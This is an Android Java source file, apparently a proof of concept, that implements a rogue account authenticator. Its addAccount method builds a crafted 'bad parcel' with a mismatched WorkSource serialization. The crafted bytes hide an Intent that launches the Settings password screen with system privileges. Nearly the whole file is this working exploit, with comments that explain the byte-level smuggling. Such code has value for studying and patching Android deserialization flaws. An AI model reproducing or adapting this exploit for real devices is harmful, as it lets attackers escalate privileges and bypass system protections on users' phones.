package com.example.badparcel;

import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle options) throws NetworkErrorException {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3); // 3 bundle items
        obtain2.writeInt(13); // key length
        obtain2.writeInt(2); // key string start
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0); // key string end
        obtain2.writeInt(4); // Parcelable type
        obtain2.writeString("android.os.WorkSource"); // class name
        obtain2.writeInt(-1); // mNum field on work source
        obtain2.writeInt(-1); // length of int array (mUids)
        obtain2.writeInt(-1); // length of string array (mNames)
        obtain2.writeInt(1); // numChains, after reserialize it is 0
        // these later values change, written as original meaning in system server
        // -> new meaning after 1 elemen not read in
        obtain2.writeInt(-1); // actual chain list length, -1 empty list, after researialize it is 0
        // -> null key?
        obtain2.writeInt(13); // 13 character key
        // -> bytearray type
        obtain2.writeInt(13); // start key
        // -> 13 length bytearray
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0); // end key
        obtain2.writeInt(1); // integer type
        obtain2.writeInt(1); // integer
        obtain2.writeInt(13); // 13 character key
        obtain2.writeInt(22); // start key
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0); // end key
        obtain2.writeInt(13); // bytearray
        obtain2.writeInt(-1); // bytearray length, contains malicous intent
        int dataPosition = obtain2.dataPosition();
        // key value pair for intent, stored within byte array
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(dataSize));
        // bundle header (size, bundle magic)
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        // data
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        Log.d(TAG, bundle.toString());
        return bundle;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}
